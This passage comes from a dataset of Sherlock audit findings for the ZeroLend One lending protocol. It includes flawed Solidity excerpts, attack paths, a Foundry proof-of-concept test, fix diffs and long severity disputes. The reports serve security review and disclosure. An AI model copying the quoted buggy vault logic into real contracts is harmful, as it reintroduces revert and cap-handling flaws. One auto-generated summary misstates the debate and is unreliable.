the user will not be able to withdraw a certain amount of collateral, since they cant repay.\n\nLets say they deposit $100 and borrow $80. (LTV is 80%)\n\nNow they cant repay the $80, so their $100 is stuck forever. So they effectively lost $20. \n\n**DemoreXTess**\n\n@0xjuaan How it's stuck I don't understand ? It will revert after if statement.\n\n**0xjuaan**\n\n@DemoreXTess repayment reverts, so they cant withdraw their collateral (they need to repay debt in order to withdraw collateral), so they lose funds since collateral value > debt value\n\n**iamnmt**\n\nI believe this issue is low severity.\n\nThe user can call `pool.forceUpdateReserve` before `repay` and `repayETH` to update the `borrowIndex`, and then the repayment will not revert. If the user fails to do so, then it is a user mistake.\n\n**cvetanovv**\n\nAs I wrote in my previous comment `repay()` and `repayETH()` do not work as they should. This is the main impact and because of this, I classify this issue as Medium severity. We have broken functionality.\n\nMy decision to reject the escalation remains.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [haxatron](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/467/#issuecomment-2394853299): rejected",
      "summary": "\nThis bug report discusses an issue with the `repay()` and `repayETH()` functions in the NFTPositionManager contract. These functions are not working properly and may cause a loss of funds for users. This is considered a medium severity issue because it breaks core contract functionality, but requires specific conditions to occur. The impact is that users may not be able to withdraw their collateral, resulting in a loss of funds. To mitigate this issue, the team should consider adding a direct reserve update before reading from the state. This issue has been resolved and was found by several security researchers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/467",
      "tags": [],
      "finders": [
        "stuart\\_the\\_minion",
        "zarkk01",
        "JCN",
        "denzi\\_",
        "thisvishalsingh",
        "000000",
        "Obsidian",
        "hyh",
        "A2-security"
      ]
    },
    {
      "id": "41834",
      "title": "M-13: Curated Vault allocators cannot `reallocate()` a pool to zero due to attempting to withdraw 0 tokens from the underlying pool",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/434 \n\n## Found by \n000000, 0xAristos, 0xc0ffEE, A2-security, KupiaSec, Nihavent, Obsidian, Varun\\_05, aman, dany.armstrong90, hyh, iamnmt, karsar, rilwan99, stuart\\_the\\_minion, theweb3mechanic, trachev, wickie, zarkk01\n### Summary\n\nThe `reallocate()` function is the primary way a curated vault can remove liquidity from an underlying pool, so being unable to fully remove the liquidity is problematic. However, due to a logic issue in the implementation, any attempt to `reallocate()` liquidity in a pool to zero will revert. \n\n### Root Cause\n\nThe function `CuratedVault::reallocate()` is callable by an allocator and reallocates funds between underlying pools. As shown below, `toWithdraw` is the difference between `supplyAssets` (total assets in the underlying pool controlled by the curated vault) and the `allocation.assets` which is the target allocation for this pool. Therefore, if `toWithdraw` is greater than zero, a withdrawal is required from that pool:\n\n```javascript\n  function reallocate(MarketAllocation[] calldata allocations) external onlyAllocator {\n    uint256 totalSupplied;\n    uint256 totalWithdrawn;\n\n    for (uint256 i; i < allocations.length; ++i) {\n      MarketAllocation memory allocation = allocations[i];\n      IPool pool = allocation.market;\n\n      (uint256 supplyAssets, uint256 supplyShares) = _accruedSupplyBalance(pool);\n@>    uint256 toWithdraw = supplyAssets.zeroFloorSub(allocation.assets);\n\n      if (toWithdraw > 0) {\n        if (!config[pool].enabled) revert CuratedErrorsLib.MarketNotEnabled(pool);\n\n        // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.\n        uint256 shares;\n        if (allocation.assets == 0) {\n          shares = supplyShares;\n@>        toWithdraw = 0;\n        }\n\n@>      DataTypes.SharesType memory burnt = pool.withdrawSimple(asset(), address(this), toWithdraw, 0);\n        emit CuratedEventsLib.ReallocateWithdraw(_msgSender(), pool, burnt.assets, burnt.shares);\n        totalWithdrawn += burnt.assets;\n      } else {\n        \n        ... SKIP!...\n      }\n    }\n```\n\nThe issue arrises when for any given pool, `allocation.assets` is set to 0, meaning the allocator wishes to empty that pool and allocate the liquidity to another pool. Under this scenario, `toWithdraw` is set to 0, and passed into `Pool::withdrawSimple()`. This is a logic mistake to attempt to withdraw 0 instead of the `supplyAssets` when attempting to withdraw all liquidity to a pool. The call will revert due to a [check](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ValidationLogic.sol#L97) in the pool's withdraw flow that ensures the amount being withdrawn is greater than 0.\n\nIt seems this bug is a result of forking the Metamorpho codebase which [implements the same logic](https://github.com/morpho-org/metamorpho/blob/cc6b01610c9b0000d965faef705e1670859d9c0f/src/MetaMorpho.sol#L382-L389). However, Metamorpho's underlying withdraw() function [can take either an asset amount or share amount](https://github.com/morpho-org/morpho-blue/blob/0448402af51b8293ed36653de43cbee8d4d2bfda/src/Morpho.sol#L216-L217), but ZeroLend's `Pool::withdrawSimple()` only [accepts an amount of assets](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/Pool.sol#L94). \n\n### Internal pre-conditions\n\n1. A curated vault having more than 1 underlying pool in the `supplyQueue`\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. A curated vault is setup with more than 1 underlying pool in the `supplyQueue`\n2. An allocator wishes to reallocate all the supplied liquidity from one pool to another\n3. The allocator calls constructs the array of `MarketAllocation` withdrawing all liquidity from the first pool and depositing the same amount to the second pool\n4. The action fails due to the described bug\n\n### Impact\n\n- Allocators cannot remove all liquidity in a pool throuhg the `reallocate()` function. The natspec comments indicate that emptying a pool to zero through the `reallocate()` function is the [first step of the intended way to remove a pool](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/interfaces/vaults/ICuratedVaultBase.sol#L141-L142).  \n\n### PoC\n\nPaste and run the below test in /test/forge/core/vaults/. It shows a simple 2-pool vault with a single depositors. An allocator attempts to reallocate the liquidity in the first pool to the second pool, but reverts due to the described issue.\n\n```javascript\n// SPDX-License-Identifier: GPL-2.0-or-later\npragma solidity ^0.8.0;\n\nimport {Math} from '@openzeppelin/contracts/utils/math/Math.sol';\nimport './helpers/IntegrationVaultTest.sol';\nimport {console2} from 'forge-std/src/Test.sol';\nimport {MarketAllocation} from '../../../../contracts/interfaces/vaults/ICuratedVaultBase.sol';\n\ncontract POC_AllocatorCannotReallocateToZero is IntegrationVaultTest {\n  function setUp() public {\n    _setUpVault();\n    _setCap(allMarkets[0], CAP);\n    _sortSupplyQueueIdleLast();\n\n    oracleB.updateRoundTimestamp();\n    oracle.updateRoundTimestamp();\n  }\n\n  function test_POC_AllocatorCannotReallocateToZero() public {\n\n    // 1. supplier supplies to underlying pool through curated vault\n    uint256 assets = 10e18;\n    loanToken.mint(supplier, assets);\n\n    vm.startPrank(supplier);\n    uint256 shares = vault.deposit(assets, onBehalf);\n    vm.stopPrank();\n\n    // 2. Allocator attempts to reallocate all of these funds to another pool\n    MarketAllocation[] memory allocations = new MarketAllocation[](2);\n    \n    allocations[0] = MarketAllocation({\n        market: vault.supplyQueue(0),\n        assets: 0\n    });\n\n    // Fill in the second MarketAllocation struct\n    allocations[1] = MarketAllocation({\n        market: vault.supplyQueue(1),\n        assets: assets\n    });\n\n    vm.startPrank(allocator);\n    vm.expectRevert(\"NOT_ENOUGH_AVAILABLE_USER_BALANCE\");\n    vault.reallocate(allocations); // Reverts due to attempting a withdrawal amount of 0\n  }\n}\n```\n\n### Mitigation\n\nThe comment \"Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market\" does not seem to apply to Zerolend pools as a donation to the pool would not disable the market, nor would it affect the amount of assets the curated vault can withdraw from the underlying pool. With this in mind, Metamorpho's safety check can be removed:\n\n```diff\n  function reallocate(MarketAllocation[] calldata allocations) external onlyAllocator {\n    uint256 totalSupplied;\n    uint256 totalWithdrawn;\n\n\n    for (uint256 i; i < allocations.length; ++i) {\n      MarketAllocation memory allocation = allocations[i];\n      IPool pool = allocation.market;\n\n      (uint256 supplyAssets, uint256 supplyShares) = _accruedSupplyBalance(pool);\n      uint256 toWithdraw = supplyAssets.zeroFloorSub(allocation.assets);\n\n      if (toWithdraw > 0) {\n        if (!config[pool].enabled) revert CuratedErrorsLib.MarketNotEnabled(pool);\n\n\n-       // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.\n-       uint256 shares;\n-       if (allocation.assets == 0) {\n-         shares = supplyShares;\n-         toWithdraw = 0;\n-       }\n\n        DataTypes.SharesType memory burnt = pool.withdrawSimple(asset(), address(this), toWithdraw, 0);\n        emit CuratedEventsLib.ReallocateWithdraw(_msgSender(), pool, burnt.assets, burnt.shares);\n        totalWithdrawn += burnt.assets;\n      } else {\n        uint256 suppliedAssets =\n          allocation.assets == type(uint256).max ? totalWithdrawn.zeroFloorSub(totalSupplied) : allocation.assets.zeroFloorSub(supplyAssets);\n\n        if (suppliedAssets == 0) continue;\n\n        uint256 supplyCap = config[pool].cap;\n        if (supplyCap == 0) revert CuratedErrorsLib.UnauthorizedMarket(pool);\n\n        if (supplyAssets + suppliedAssets > supplyCap) revert CuratedErrorsLib.SupplyCapExceeded(pool);\n\n        // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.\n        IERC20(asset()).forceApprove(address(pool), type(uint256).max);\n        DataTypes.SharesType memory minted = pool.supplySimple(asset(), address(this), suppliedAssets, 0);\n        emit CuratedEventsLib.ReallocateSupply(_msgSender(), pool, minted.assets, minted.shares);\n        totalSupplied += suppliedAssets;\n      }\n    }\n\n    if (totalWithdrawn != totalSupplied) revert CuratedErrorsLib.InconsistentReallocation();\n  }\n```",
      "summary": "\nThe `reallocate()` function in the Curated Vault is used to remove liquidity from an underlying pool. However, due to a logic issue, attempting to remove all liquidity from a pool by setting it to zero will cause the function to fail. This is because the function tries to withdraw 0 tokens from the pool, which is not allowed. This bug was found by several individuals and can be fixed by removing a safety check in the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/434",
      "tags": [],
      "finders": [
        "dany.armstrong90",
        "trachev",
        "wickie",
        "iamnmt",
        "aman",
        "zarkk01",
        "KupiaSec",
        "000000",
        "theweb3mechanic",
        "Obsidian",
        "0xAristos",
        "A2-security",
        "stuart\\_the\\_minion",
        "Nihavent",
        "karsar",
        "Varun\\_05",
        "rilwan99",
        "0xc0ffEE",
        "hyh"
      ]
    },
    {
      "id": "41833",
      "title": "M-12: `CuratedVaultSetters::_supplyPool()` does not consider the pool cap of the underlying pool, which may cause `deposit()` to revert or lead to an unintended reordering of `supplyQueue`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433 \n\n## Found by \nBigsam, Nihavent, wellbyt3\n### Summary\n\nThe curated vault's `_supplyPool()` function deposits assets into the underlying pools in `supplyQueue`. Whilst it considers the curated vault's cap for a given pool, it does not consider the underlying pool's internal cap. As a result, some `CuratedVault::deposit()` transactions will revert due to running out of pools to deposit to, or the liquidity will be allocated to the `supplyQueue` in a different order. \n\n### Root Cause\n\n`CuratedVaultSetters::_supplyPool()` is [called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L38) in the deposit flow of the curated vault. As shown below, it attempts to deposit the minimum of `assets` and `supplyCap - supplyAssets` (which is the 'available curated pool cap' for this pool). \n\n```javascript\n  function _supplyPool(uint256 assets) internal {\n    for (uint256 i; i < supplyQueue.length; ++i) {\n      IPool pool = supplyQueue[i];\n\n      uint256 supplyCap = config[pool].cap;\n      if (supplyCap == 0) continue;\n\n      pool.forceUpdateReserve(asset());\n\n      uint256 supplyShares = pool.supplyShares(asset(), positionId);\n\n      // `supplyAssets` needs to be rounded up for `toSupply` to be rounded down.\n      (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = pool.marketBalances(asset());\n@>    uint256 supplyAssets = supplyShares.toAssetsUp(totalSupplyAssets, totalSupplyShares);\n\n@>    uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);\n\n      if (toSupply > 0) {\n        // Using try/catch to skip markets that revert.\n        try pool.supplySimple(asset(), address(this), toSupply, 0) {\n          assets -= toSupply;\n        } catch {}\n      }\n\n      if (assets == 0) return;\n    }\n\n    if (assets != 0) revert CuratedErrorsLib.AllCapsReached();\n  }\n```\n\nHowever, the function does not consider an underlying pool's `supplyCap`. Underlying pools have their own `supplyCap` which will cause `supply()` calls to revert if they would put the pool over it's `supplyCap`:\n\n```javascript\n  function validateSupply(\n    DataTypes.ReserveCache memory cache,\n    DataTypes.ReserveData storage reserve,\n    DataTypes.ExecuteSupplyParams memory params,\n    DataTypes.ReserveSupplies storage totalSupplies\n  ) internal view {\n    ... SKIP!...\n\n    uint256 supplyCap = cache.reserveConfiguration.getSupplyCap();\n\n    require(\n      supplyCap == 0\n@>      || ((totalSupplies.supplyShares + uint256(reserve.accruedToTreasuryShares)).rayMul(cache.nextLiquidityIndex) + params.amount)\n          <= supplyCap * (10 ** cache.reserveConfiguration.getDecimals()),\n      PoolErrorsLib.SUPPLY_CAP_EXCEEDED\n    );\n  }\n```\n\nAlso note that the `pool::supplySimple()` call in `_supplyPool()` is wrapped in a [try/catch block](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L134-L136), so if a `pool::supplySimple()` call were to revert, it will just continue to the next pool.\n\n### Internal pre-conditions\n\n- A `CuratedVault::deposit()` call needs to be within the limits of the curated vault's cap (`config[pool].cap`) but exceed the limits of the underlying pool's `supplyCap`.\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. A curated pool has two pools in the `supplyQueue`.\n2. The first underlying pool has an internal `supplyCap` of 100e18 and is currently at 99e18.\n3. The first underlying pool has an internal `supplyCap` of 100e18 and is currently at 99e18.\n4. A user calls `deposit()` on the curated vault with a value of 2e18.\n5. The value does not exceed the curated vault's `config[pool].cap` for either pool.\n6. The underlying call to `Pool::supplySimple()` will silently revert on both pools, and the entire transaction will revert due to [running out of available pools to supply the assets to](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L142)\n7. As a result, no assets are deposits, despite the underlying pools having capacity to accept the 2e18 deposit between them.\n\n### Impact\n\n**Deposit Reverts**\n- If a deposit would be able to be deposited across two or more underlying pools in the `supplyQueue`, but is too large to be added to any one of these underlying pools, the deposit will completely revert, despite the underlying pools having capacity to accept the deposit.\n\n**Inefficient reorder of `supplyQueue`**\n- If a deposit amount is within the limits of the curated pool's `config[pool].cap`, but would exceed the limits an underlying pool in `supplyQueue`. Then the silent revert would skip this pool and attempt to deposit it's liquidity to the next pool in the queue. This is an undesired/inefficient reordering of the `supplyQueue` as a simple check on the cap of the underlying pool would reveal some amount that would be accepted by the underlying pool.\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nCreate an external getter for a pool's supply cap, similar to `ReserveConfiguration::getSupplyCap()` the next function should also scale the supply cap by the reserve token's decimals. \n\nThen, add an extra check in `CuratedVaultSetters::_supplyPool()` as shown below.\n\n\n```diff\n  function _supplyPool(uint256 assets) internal {\n    for (uint256 i; i < supplyQueue.length; ++i) {\n      IPool pool = supplyQueue[i];\n\n      uint256 supplyCap = config[pool].cap;\n      if (supplyCap == 0) continue;\n\n      pool.forceUpdateReserve(asset());\n\n      uint256 supplyShares = pool.supplyShares(asset(), positionId);\n\n      // `supplyAssets` needs to be rounded up for `toSupply` to be rounded down.\n      (uint256 totalSupplyAssets, uint256 totalSupplyShares,,) = pool.marketBalances(asset());\n      uint256 supplyAssets = supplyShares.toAssetsUp(totalSupplyAssets, totalSupplyShares);\n\n      uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);\n\n+     toSupply = UtilsLib.min(toSupply, pool.getSupplyCap(pool.getConfiguration(asset())) - totalSupplyAssets );\n\n      if (toSupply > 0) {\n        // Using try/catch to skip markets that revert.\n        try pool.supplySimple(asset(), address(this), toSupply, 0) {\n          assets -= toSupply;\n        } catch {}\n      }\n\n      if (assets == 0) return;\n    }\n\n    if (assets != 0) revert CuratedErrorsLib.AllCapsReached();\n  }\n```\n\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Honour** commented:\n>  Invalid: see comment on #193\n\n\n\n**Nihavent**\n\nEscalate\n\nThis report should be valid and is not a duplicate of https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/399 which is about `maxWithdraw` and `maxRedeem` being non-ERC4626 compliant due to a bug in `_withdrawable()`. \nOn the other hand, this report describes that `_supplyPool()` ignoring the underlying pool cap can result in unexpectedly reverting deposits or an inefficient reordering of the supplyQueue.\n\n\nTo address the comment left on https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193 that was referenced on this report:\n\n>\"setCap is an admin operation and It can be expected that the curators will set (there's no reason to assume otherwise) a similar pool(vault) cap as the underlying pool\"\n\nI believe there is a flaw in this reasoning.\n\n- The `supplyCap` stored in `CuratedVaultStorage::config[pool].cap` is the cap of deposits into a given underlying pool from this `CuratedVault`.\n- The underlying pool cap stored in the `DataTypes.ReserveConfigurationMap` for the underlying pool describes the total deposits to this underlying pool from all sources (including but not limited to this `CuratedVault`).\n\nIt's true the curator sets the `supplyCap` for the curated vault, however they are not in control of other deposts to the underlying pool. So, attempting to set them to similar values will only prevent this issue as long as there are no other deposits in the underlying pool, which is not a valid assumption for a curator to make.\n\nTherefore both impacts in this report can occur regardless of the admin-set value.\n\n\n**sherlock-admin3**\n\n> Escalate\n> \n> This report should be valid and is not a duplicate of https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/399 which is about `maxWithdraw` and `maxRedeem` being non-ERC4626 compliant due to a bug in `_withdrawable()`. \n> On the other hand, this report describes that `_supplyPool()` ignoring the underlying pool cap can result in unexpectedly reverting deposits or an inefficient reordering of the supplyQueue.\n> \n> \n> To address the comment left on https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193 that was referenced on this report:\n> \n> >\"setCap is an admin operation and It can be expected that the curators will set (there's no reason to assume otherwise) a similar pool(vault) cap as the underlying pool\"\n> \n> I believe there is a flaw in this reasoning.\n> \n> - The `supplyCap` stored in `CuratedVaultStorage::config[pool].cap` is the cap of deposits into a given underlying pool from this `CuratedVault`.\n> - The underlying pool cap stored in the `DataTypes.ReserveConfigurationMap` for the underlying pool describes the total deposits to this underlying pool from all sources (including but not limited to this `CuratedVault`).\n> \n> It's true the curator sets the `supplyCap` for the curated vault, however they are not in control of other deposts to the underlying pool. So, attempting to set them to similar values will only prevent this issue as long as there are no other deposits in the underlying pool, which is not a valid assumption for a curator to make.\n> \n> Therefore both impacts in this report can occur regardless of the admin-set value.\n> \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\n@Nihavent The impact is very similar to issues #337 and #431. \n\nYou can see this comment: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/337#issuecomment-2402013737\n\nI see no reason for it to be any different here. \n\n**Nihavent**\n\n@cvetanovv the root cause is similar to the issues you referenced but the impact here is higher. \n\nThe maximum impact on the issues you linked is non compliance with the EIP which can break external integrations, as you mentioned this does not necessarily qualify as medium impact. \n\n\nThe maximum impact on this issue is reverting deposits when the pools have capacity to support the deposit (see attack path). This is an implementation bug which is broken contract functionality. \nAdditionally, assets can be allocated to underlying pools in an order which differs from the depositQueue. \n\nThis issue has nothing to do with EIP compliance. \n\nFor reference this issue has the same root cause and impact as https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178\n\n**cvetanovv**\n\n@Nihavent I agree that in this issue, the impact is one idea more serious, and we enter the category \"broken contract functionality\".\n\nPlanning to accept the escalation and remove the duplication with #399. I will duplicate this issue(#433) with #193 and #339. This issue will be the main.\n\n**0xjuaan**\n\nHi @cvetanovv, please consider the following [judging comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193#issuecomment-2364150838) regarding why this issue is invalid.\n\nVault curators should not set a cap that is greater than the cap of underlying pools. It makes no sense to do so. For example if the underlying pool allows a max of `10e18`, then vault curators should set a deposit cap that is less than or equal to 10e18. This issue requires vault curators to set a cap that is higher than the underlying pool's cap, so is invalid.\n\n\n**Nihavent**\n\n> Hi @cvetanovv, please consider the following [judging comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193#issuecomment-2364150838) regarding why this issue is invalid.\n> \n> Vault curators should not set a cap that is greater than the cap of underlying pools. It makes no sense to do so. For example if the underlying pool allows a max of `10e18`, then vault curators should set a deposit cap that is less than or equal to 10e18. This issue requires vault curators to set a cap that is higher than the underlying pool's cap, so is invalid.\n\nThis is not true as I explained here https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433#issuecomment-2391351629\n\nImagine the super pool has 2 underlying pools each with an underlying cap of 10e18. The SuperPool admin sets their caps to 10e18 as you said. Each underlying pool receives deposits from other sources to the value of 9e18. Now a user trying to deposit 2e18 into the SuperPool will revert even though this deposit could be split across the two underlying pools. \n\nTherefore carefully setting the SuperPool cap for a given pool is only an effective mitigation if there are 0 deposits from other sources in the underlying pool. As I previously mentioned this is an unrealistic assumption for anyone to make. \n\n>”This issue requires vault curators to set a cap that is higher than the underlying pool's cap, so is invalid.”\n\nThis is also incorrect because in the above example the SuperPool cap set for the two pools could be 5e18 and the issue still exists. \n\n\nI believe this is straightforward but if you require a POC showing the issue when the SuperPool cap is < the underlying pool cap I can write one tomorrow. \n\n\n**0xjuaan**\n\nYeah actually you're right @Nihavent, the issue can still occur. I still think that the issue would not exist if vault curators set an appropriate cap, and that is why Morpho decided to implement it this way. In the case that an event like the described one occurs, the curators can reduce the cap of the pool such that only 1e18 can be deposited into each pool, and this prevents the revert.\n\nThat is the reason why `submitCap()` has no timelock for reducing a pool cap, but does have a timelock for increasing the pool cap. It's because reducing pool caps should be able to happen to prevent the described issue. \n\n**Nihavent**\n\nEdit: Updated this comment with a more considered and complete response.\n\n@0xjuaan thanks for acknowledging the example I provided which shows the issue is possible regardless of carefuly set admin values. I do concede this issue is less likely to occur (but not impossible) if the admin continuously sets conservatively low SuperPool caps for the underlying pools (relative to available caps in the underlying pools). However, I will now explain why I don't believe the SuperPool cap should or would ever be used for this purpose. \n\nThere are two relevant caps we're discussing:\n1. The SuperPool cap which is the maximum allocation that a SuperPool will allocate to a given underlying pool, and\n2. The underlying pool's cap which is the maximum liquidity from all sources that can be deposited into the pool\n\nWe can make inferences from the fact that these two caps exist:\n\n- The SuperPool cap (1) is set by curators to represent the ideal maximum allocation to an underlying pool. This is one of the risk management tools at the disposal of the SuperPool admins. \n- If the intended use case of the SuperPool cap (1) was to always have it set to the available cap in the underling pool (2), this could have been achieved programatically and in fact the parameter (1) wouldn't exist. \n\n[This comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433#issuecomment-2402719025) suggests that a partial mitigation to this issue is to burden SuperPool curators with administrative work of continuously checking for a reduction in available cap in all underlying pools, and reducing the corresponding SuperPool cap to reflect this change. The evidence given for this is there is no timelock on reduction in superPool caps. I believe there are problems with this:\n\n1. It completely reduces the purpose of the SuperPool cap from a risk management/capital allocation tool to an administrative task for curators to update (in order to prevent edge-case deposit reverts). \n2. We can reasonably expect that curators would not update the cap in this way because:\n   - The effort / benefits tradeoff doesn't make sense fo them to use the parameter in this way. They would care more about achieving their ideal capital allocation than preventing deposit reverts into the SuperPool.\n   - It is a waste of gas to update it potentially several times per day per underlying pool\n   - It is logistically impractical to poll for reductions in available caps across all underlying pools, they would need a bot to do this and then  backrun underlying pool `supply()` calls with `submitCap()` calls. \n   - Whilst the cap can be reduced without a timelock, it requires a timelock to increase. Therefore if they reduced it to protect against this issue, and then there is a withdrawal from the underlying pool, they can't increase the cap again quickly. Therefore, their pool loses the chance to deposit more liquidity and a different SuperPool that wasn't continuously reducing their cap gets to deposit this liquidity instead.\n\nSo whilst it’s technically possible to reduce the likelihood of this issue with admin actions, it is unreasonable to expect the admin to use the parameter for this purpose. \n   \n\n**Honour-d-dev**\n\nI also believe this issue is not worth a medium severity, `submitCap()` is an admin operation and it has been shown that the protocol is designed in such a way that its easy for the admin to handle this if it ever happens (and the chances of it happening are vey slim if the admin sets a reasonable cap to begin with)\n\n**Nihavent**\n\n> I also believe this issue is not worth a medium severity, `submitCap()` is an admin operation and it has been shown that the protocol is designed in such a way that its easy for the admin to handle this if it ever happens (and the chances of it happening are vey slim if the admin sets a reasonable cap to begin with)\n\nI agree the issue is not going to occur frequently due to it being a bug that occurs in edge cases. To my knowledge the likelihood of the bug does not play a role in Sherlock’s judging rules. \n\nCheck my previous comment for an explanation as to why setCap would need to be misused to reduce the likihood of this bug. \n\nIt has also been shown that this issue can occur regardless of admin set values. \n\n**cvetanovv**\n\nI believe this issue should be Low severity.\n\nWhile it could lead to some deposit reverts or inefficiencies in the `supplyQueue`, it's important to note that this is an admin-controlled action. Admins have the ability to set reasonable caps and monitor pool configurations effectively to prevent such situations. \n\nAdditionally, there is no direct loss of funds.\n\nFor these reasons, I believe that this issue is of low severity.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**Nihavent**\n\nHi, thanks for consideration of the issue. \n\nIt has been shown that this issue can occur regardless of the most reasonable admin setCap value. This is because the available liquidity in underlying pools can change quickly. \n\nFor this parameter to be used in a way to almost completely avoid this issue, the cap would need to be set extremely low which defeats the purpose of the pool being in the supply queue. \n\nAdditionally, as I explained in detail [here](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433#issuecomment-2402738726) the setCap functionality should not and will not be used to reduce the likelihood of this issue. \nRequiring curators to setCap to avoid this issue costs them the functionality of setting their optimal liquidity allocation to each pool, ie. they lose the intended functionality of the parameter in order to prevent edge-case deposit reverts. Therefore no rational actor would use the parameter in this way. \n\nIf the protocol didn’t want curators to be able to freely set caps, the parameter wouldn’t exist and vaults would inherit the available caps from the underlying pools. \n\nAs it stands, with admins freely setting their optimal caps as per the design, there is a bug in the implementation. \n\n\n**Honour-d-dev**\n\nThis issue is a low severity\n\nThere is no loss of funds or broken functionality or any substantial impact, the only issue here is a short/temporary inconvenience for the user that can be immediately and easily fixed by admin adjusting the cap or reordering the queue if necessary \n\n**cvetanovv**\n\nThis issue is а valid Low severity.\n\nHere are the rules for Medium severity:\nhttps://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue\n\n>1. Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n>2. Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party larger than 0.01% and 10 USD.\n\nIn this issue, there is neither loss of funds nor broken functionality.\n\nMy decision to reject the escalation remains.\n\n**Nihavent**\n\nIf this issue does not have enough impact for medium severity, how is this issue a valid medium? https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178\n\nI understand that reports will be judged on a case-by-case basis, but there is no meaningful difference between the protocols with respect to this issue, and the submitted issues are the same. Therefore for consistency if there is enough impact in [that](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/178) issue for medium, there must be enough impact in this issue for medium. \nHow are Watsons able to gauge which issues consistitue a medium if this level of consistency is not present?\n\n- Both issues have a vault which sometimes fails to deposit into underlying pools in the queue because the available liquidity in the underlying pool is not checked. \n- Both issues can result in deposit reverts or undesired reorderings of the queue.\n- Both issues have an admin-set cap for the vault's maximum deposit into the underlying pool\n- Both issues have the same pre-conditions\n- Both issues have the same fix\n\n**cvetanovv**\n\n@Nihavent You are right about that. As you can see in the comments, I was hesitant about having broken functionality. After the protocol comment, then I decided it was Medium because it was important for them to have the function not revert.\n\nIn this contract(`CuratedVaultSetters.sol`), we also have indications that the function should not revert, so I think we have broken functionality here also: https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L133\n\nPlanning to accept the escalation and make this issue Medium.\n\n**0xSpearmint**\n\nHi @cvetanovv [193](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193) is also a duplicate of this issue.\n\n**cvetanovv**\n\n> Hi @cvetanovv [193](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/193) is also a duplicate of this issue.\n\nThanks for the mention. I will also duplicate #193 to this issue.\n\n**WangSecurity**\n\nResult:\nMedium \nHas duplicates\n\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Nihavent](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433/#issuecomment-2391351629): accepted",
      "summary": "\nThis bug report discusses an issue with the `_supplyPool()` function in the CuratedVault contract. The function does not take into account the cap of the underlying pool, which can cause deposits to fail or be allocated in a different order. The root cause is that the function only considers the curated vault's cap, not the underlying pool's cap. This issue can occur regardless of the admin-set values, and requiring curators to set a lower cap would defeat the purpose of the pool. The severity of this issue is being debated, with some arguing it is low because it only causes temporary inconvenience, while others argue it is medium because it can lead to a loss of funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/433",
      "tags": [],
      "finders": [
        "Nihavent",
        "wellbyt3",
        "Bigsam"
      ]
    },
    {
      "id": "41832",
      "title": "M-11: Supply interest is earned on `accruedToTreasuryShares` resulting in higher than expected treasury fees and under rare circumstances DOSed pool withdrawals",
      "impact": "MEDIUM",
